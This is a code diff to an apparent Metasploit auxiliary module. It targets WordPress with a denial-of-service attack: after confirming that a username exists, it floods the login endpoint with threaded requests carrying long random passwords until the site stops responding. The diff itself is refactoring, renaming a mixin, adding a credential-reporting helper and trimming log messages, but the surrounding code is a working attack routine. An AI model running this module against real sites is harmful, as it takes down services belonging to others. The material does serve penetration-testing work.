@@ -6,7 +6,7 @@
 require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
-  include Msf::HTTP::Wordpress
+  include Msf::Exploit::Remote::HTTP::Wordpress
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
@@ -68,21 +68,46 @@ class Metasploit3 < Msf::Auxiliary
     datastore['TIMEOUT']
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user]
+    }.merge(service_data)
+
+    login_data = {
+      last_attempted_at: DateTime.now,
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def user_exists(user)
     exists = wordpress_user_exists?(user)
     if exists
-      print_good("#{peer} - Username \"#{username}\" is valid")
-      report_auth_info(
-        :host => rhost,
-        :sname => (ssl ? 'https' : 'http'),
-        :user => user,
-        :port => rport,
-        :proof => "WEBAPP=\"Wordpress\", VHOST=#{vhost}"
+      print_good("Username \"#{username}\" is valid")
+      report_cred(
+        ip: rhost,
+        port: rport,
+        user: user,
+        service_name: (ssl ? 'https' : 'http'),
+        proof: "WEBAPP=\"Wordpress\", VHOST=#{vhost}"
       )
 
       return true
     else
-      print_error("#{peer} - \"#{user}\" is not a valid username")
+      print_error("\"#{user}\" is not a valid username")
       return false
     end
   end
@@ -90,7 +115,7 @@ class Metasploit3 < Msf::Auxiliary
   def run
     if wordpress_and_online?
       if validate_user
-        print_status("#{peer} - Checking if user \"#{username}\" exists...")
+        print_status("Checking if user \"#{username}\" exists...")
         unless user_exists(username)
           print_error('Aborting operation - a valid username must be specified')
           return
@@ -100,7 +125,7 @@ class Metasploit3 < Msf::Auxiliary
       starting_thread = 1
       while starting_thread < rlimit do
         ubound = [rlimit - (starting_thread - 1), thread_count].min
-        print_status("#{peer} - Executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}...")
+        print_status("Executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}...")
 
         threads = []
         1.upto(ubound) do |i|
@@ -108,20 +133,20 @@ class Metasploit3 < Msf::Auxiliary
             begin
               wordpress_login(username, Rex::Text.rand_text_alpha(plength), timeout)
             rescue => e
-              print_error("#{peer} - Timed out during request #{(starting_thread - 1) + i}")
+              print_error("Timed out during request #{(starting_thread - 1) + i}")
             end
           end
         end
 
         threads.each(&:join)
-        print_good("#{peer} - Finished executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}")
+        print_good("Finished executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}")
         starting_thread += ubound
       end
 
       if wordpress_and_online?
-        print_error("#{peer} - FAILED: #{target_uri} appears to still be online")
+        print_error("FAILED: #{target_uri} appears to still be online")
       else
-        print_good("#{peer} - SUCCESS: #{target_uri} appears to be down")
+        print_good("SUCCESS: #{target_uri} appears to be down")
       end
     else
       print_error("#{rhost}:#{rport}#{target_uri} does not appear to be running WordPress")
